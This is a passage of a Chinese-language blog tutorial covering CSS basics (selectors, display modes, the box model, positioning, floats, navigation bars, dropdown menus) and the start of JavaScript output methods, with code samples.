class="hljs-number">2</span>的儿子，作为对象。<br></code></pre></td></tr></table></figure><p><strong>并集选择器</strong><br>并集选择器可以选择多组标签，同时为他们定义相同样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>,<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">color</span>: pink;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>伪类选择器</strong><br>伪类选择器书写最大的特点是用冒号<code>:</code>表示</p><p>链接伪类选择器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>  选择所有未访问过的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>&#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>    <span class="hljs-attribute">text-decoration</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>   选择所有已被访问的链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span>&#123;<br>    <span class="hljs-attribute">color</span>: orange;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>   选择鼠标经过的那一个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>选择鼠标按下，但未弹起鼠标的那个链接<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span>&#123;<br>    <span class="hljs-attribute">color</span>: green;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意事项：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">为保证链接系列生效，必须保证LVHA的顺序进行声明。<br>链接都有默认样式，必须用<span class="hljs-selector-tag">a</span>单独指定样式<br>开发中：<br><span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">color</span>: grey;<br>&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">color</span>: skyblue;<br>&#125;<br>即可<br></code></pre></td></tr></table></figure><p><strong>focus伪类选择器</strong><br>用于选取获得焦点的表单元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: pink;<br>&#125;<br>则获得光标的<span class="hljs-selector-tag">input</span>元素，背景会变为pink色。<br></code></pre></td></tr></table></figure><h4 id="元素的显示模式"><a href="#元素的显示模式" class="headerlink" title="元素的显示模式"></a>元素的显示模式</h4><p>元素显示模式就是元素（标签）以什么方式进行显示</p><p>如div独占一行，但一行可以放很多span</p><p>HTML元素一般分为块元素和行内元素两种类型。</p><p><strong>块元素</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>~<span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>等等，都是块元素<br>特点：<br>霸道，独占一行<br>可以嵌套，成为容器<br>但<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>标签以及<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>系列标签主要存放文字，所以其中不能放块级元素<br>宽度默认是容器的100%<br></code></pre></td></tr></table></figure><p><strong>行内元素</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">a</span>&gt;,&lt;strong&gt;......<br>特点:<br>一行可以写多个，放在一行内显示<br>高、宽直接设置是无效的<br>默认宽度就是本身内容的宽度<br>行内元素内只能放文本或其他行内元素<br>注意：<br><span class="hljs-keyword">a</span>内不能放<span class="hljs-keyword">a</span><br><span class="hljs-keyword">a</span>内可以放块级元素。但给<span class="hljs-keyword">a</span>转换为块级模式最安全<br></code></pre></td></tr></table></figure><p><strong>行内块元素</strong><br>如img，input标签</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">特点：<br>一行内可以放多个此元素，中间会有空白空隙<br>此元素可以设置宽和高<br></code></pre></td></tr></table></figure><p><strong>元素显示模式的转换</strong><br>如：a链接增加其触发范围<br>转换为块元素:<br>display:block;<br>转换为行内元素：<br>display:inline;</p><p><strong>单行文字垂直居中</strong><br>小技巧：<br>让文字行高等于盒子的高度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<br></code></pre></td></tr></table></figure><h3 id="CSS3列表"><a href="#CSS3列表" class="headerlink" title="CSS3列表"></a>CSS3列表</h3><p>为ul、ol设置不同的列表项标记<br><code>list-style-type</code></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>.<span class="hljs-string">a</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">circle</span>;&#125;圆点状列表标记<br>.<span class="hljs-string">b</span>&#123;<span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">square</span>;&#125;方形列表标记<br><span class="hljs-string">none</span>就是无标记<br></code></pre></td></tr></table></figure><p>也可指定图像，进行标记</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>    <span class="hljs-built_in">list-style-image:</span> <span class="hljs-string">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS3表格美化"><a href="#CSS3表格美化" class="headerlink" title="CSS3表格美化"></a>CSS3表格美化</h3><p>表格边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>, <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span><br>&#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br>此时会显示双边框，如果想只显示单边框<br><span class="hljs-attribute">border-collapse</span>: collapse;<br>即可<br></code></pre></td></tr></table></figure><p>表格高、宽、文字对齐</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">table</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>    <span class="hljs-attribute">text-align</span>: right;水平方向对齐<br>    <span class="hljs-attribute">vertical-align</span>: bottom;竖直方向对齐<br>&#125;<br></code></pre></td></tr></table></figure><p>表格填充<br>控制边框和表格内容之间的间距，使用td与th元素的填充属性:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">td</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;<br>&#125;<br>会使表格更大更易于观察<br></code></pre></td></tr></table></figure><h3 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h3><p><img src="/2022/06/30/front/p3.jpg"><br><strong>Margin:外边距<br>Border:边框<br>Padding:内边距<br>Content:内容</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">25px</span> solid green;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">25px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">25px</span>;<br>    //一共是<span class="hljs-number">450px</span>的宽度<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS边框Border"><a href="#CSS边框Border" class="headerlink" title="CSS边框Border"></a>CSS边框Border</h3><p>border-style属性：<br>none：无边框<br>solid：实线边框<br>等等<br>**border-width:边框宽度<br>border-color:边框颜色<br>border-top-style:顶框样式<br>等等<br>**<br>p.one{<br>    border-style: solid;<br>    border-width: 5px;<br>    border-color: red;<br>}</p><h3 id="CSS轮廓outline"><a href="#CSS轮廓outline" class="headerlink" title="CSS轮廓outline"></a>CSS轮廓outline</h3><p>轮廓是绘制于元素周围的一条线，位于边框边缘的外围</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">outline-color</span><br><span class="hljs-attribute">outline-style</span><br><span class="hljs-attribute">outline-width</span><br></code></pre></td></tr></table></figure><h3 id="CSS外边距margin"><a href="#CSS外边距margin" class="headerlink" title="CSS外边距margin"></a>CSS外边距margin</h3><p>margin用于清除周围的元素区域。margin没有背景颜色，完全透明。</p><h3 id="CSS填充padding"><a href="#CSS填充padding" class="headerlink" title="CSS填充padding"></a>CSS填充padding</h3><p>padding设置元素内，文本内容与边框之间的距离</p><h3 id="CSS内隐藏元素"><a href="#CSS内隐藏元素" class="headerlink" title="CSS内隐藏元素"></a>CSS内隐藏元素</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden</span>&#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br><span class="hljs-selector-tag">h1</span><span class="hljs-selector-class">.hidden1</span>&#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br>注意，前者只是看不见，但占空间<br>后者是不占空间<br></code></pre></td></tr></table></figure><h3 id="CSS定位position"><a href="#CSS定位position" class="headerlink" title="CSS定位position"></a>CSS定位position</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.p_fixed</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>&#125;<br>会使元素位置相对于浏览器窗口是固定位置<br></code></pre></td></tr></table></figure><h3 id="CSS溢出文本的处理Overflow"><a href="#CSS溢出文本的处理Overflow" class="headerlink" title="CSS溢出文本的处理Overflow"></a>CSS溢出文本的处理Overflow</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">overflow: visible元素不被修剪，呈现于元素框外面<br>overflow: hidden元素被剪掉<br>overflow：scroll（<span class="hljs-keyword">auto</span>）元素被剪掉，但可以用滚动条查看剩余内容。<br></code></pre></td></tr></table></figure><h3 id="CSS元素的浮动"><a href="#CSS元素的浮动" class="headerlink" title="CSS元素的浮动"></a>CSS元素的浮动</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span>&#123;<br>    <span class="hljs-attribute">float</span>: right;<br>&#125;<br>则该图片会显示在网页的右侧，而其余元素会包围它出现<br><br></code></pre></td></tr></table></figure><p>如：<br>这是参数为left时<br><img src="/2022/06/30/front/p4.png"><br>而以下为参数是right时<br><img src="/2022/06/30/front/p5.png"></p><h3 id="CSS对齐"><a href="#CSS对齐" class="headerlink" title="CSS对齐"></a>CSS对齐</h3><p>元素居中对齐：<br>先设置元素宽度<code>width</code>属性，再</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span>&#123;<br>    <span class="hljs-attribute">margin</span>: auto;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid red;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><span class="hljs-attribute">margin</span>: auto;即可使元素水平居中<br><span class="hljs-attribute">text-align</span>: center;<br>是文本居中<br><br></code></pre></td></tr></table></figure><p>而垂直居中，则设置行间距与高度height相等</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.center</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid green;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br> <br><span class="hljs-comment">/* 如果文本有多行，添加以下代码: */</span><br><span class="hljs-selector-class">.center</span> <span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.5</span>;<br>    <span class="hljs-attribute">display</span>: inline-block;<br>    <span class="hljs-attribute">vertical-align</span>: middle;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS伪元素"><a href="#CSS伪元素" class="headerlink" title="CSS伪元素"></a>CSS伪元素</h3><p>:first-line伪元素</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-line<br>&#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-variant</span>: small-caps;<br>&#125;<br>first-line伪元素只用于块级元素<br></code></pre></td></tr></table></figure><p>before/after伪元素</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">用于在元素后面或前面添加东西，如在每个&lt;<span class="hljs-selector-tag">h2</span>&gt;前面添加图片<br><span class="hljs-selector-tag">h2</span><span class="hljs-selector-pseudo">:before</span>&#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;a.jpg&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏的制作"><a href="#CSS导航栏的制作" class="headerlink" title="CSS导航栏的制作"></a>CSS导航栏的制作</h3><p>第一步：使用无序列表，元素为a标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>title4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><p>再删除列表前的点，删除边距与填充</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ul</span>&#123;<br>           <span class="hljs-built_in">list-style-type:</span> <span class="hljs-string">none</span>;<br>           <span class="hljs-string">padding</span>: <span class="hljs-string">none</span>;<br>           <span class="hljs-string">margin</span>: <span class="hljs-string">none</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p>给链接元素转换为块元素<br>并设置宽度（默认为最大，需要设置）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>&#123;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进一步设置，鼠标移动到导航栏上后，修改颜色。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#555</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br></code></pre></td></tr></table></figure><p>添加active类，被选中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.active</span>&#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;<br>    <span class="hljs-attribute">color</span>: white;<br>&#125;<br>注意，不是:而是.<br>因为这里，是标记出当前页面所在的选项，而不是正在选择<br></code></pre></td></tr></table></figure><p>加上边框</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span> &#123;<br>    <span class="hljs-attribute">text-align</span>: center;<br>    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#555</span>;<br>&#125;<br> <br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<br>    <span class="hljs-attribute">border-bottom</span>: none;<br>&#125;<br></code></pre></td></tr></table></figure><p>成为全屏高度的固定导航条</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ul</span>&#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">25%</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;<br>    <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS导航栏2–水平导航栏"><a href="#CSS导航栏2–水平导航栏" class="headerlink" title="CSS导航栏2–水平导航栏"></a>CSS导航栏2–水平导航栏</h3><p>使用内联（inline）或浮动（float）的列表项。<br><strong>内联列表项</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span><br>&#123;<br>    <span class="hljs-attribute">display</span>: inline;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS下拉菜单"><a href="#CSS下拉菜单" class="headerlink" title="CSS下拉菜单"></a>CSS下拉菜单</h3><p>当鼠标移动到指定元素上时，会出现下拉菜单</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: inline-block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: none;</span><br><span class="language-css">  <span class="hljs-attribute">position</span>: absolute;</span><br><span class="language-css">  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f9f9f9</span>;</span><br><span class="language-css">  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">160px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0px</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-number">0px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>);</span><br><span class="language-css">  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">16px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.dropdown</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-class">.dropdown-content</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>[mycode3]<br>[mycode3 type=&quot;html&quot;]<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>鼠标移动到我这！<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-content&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>菜鸟教程<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>www.runoob.com<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="JS的用法"><a href="#JS的用法" class="headerlink" title="JS的用法"></a>JS的用法</h3><p>js代码必须位于HTML中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs <script>```与```</script>```之间">通常，我们需要在某个事件发生时执行代码，比如当用户点击按钮时。<br>如果我们把 JavaScript 代码放入函数中，就可以在事件发生时调用该函数。<br>### JS的输出<br>JS没有任何打印或者输出的函数<br>**JS显示数据**<br>window.alert()<br><br>弹出警告窗口<br></code></pre></td></tr></table></figure><script>window.alert(5+6);</script><p>会弹出11的窗口</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>操作HTML元素<br>document<span class="hljs-selector-class">.getElementById</span>(<span class="hljs-string">&quot;demo&quot;</span>)<span class="hljs-selector-class">.innerHTML</span> = <span class="hljs-string">&quot;段落已修改&quot;</span><br>这个是按id查找元素，并进行操作的方法<br></code></pre></td></tr></table></figure><p id="demo">段落1</p><script>document.getElementById("demo").innerHTML = "段落已修改"</script>会显示“段落已修改”<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">直接写入<span class="hljs-selector-tag">HTML</span>文档<br></code></pre></td></tr></table></figure>document.write(Date());<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">会额外输出<span class="hljs-built_in">write</span>内的内容<br>**写到控制台**<br></code></pre></td></tr></table></figure>console.log(message)会输出内容到控制台<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### 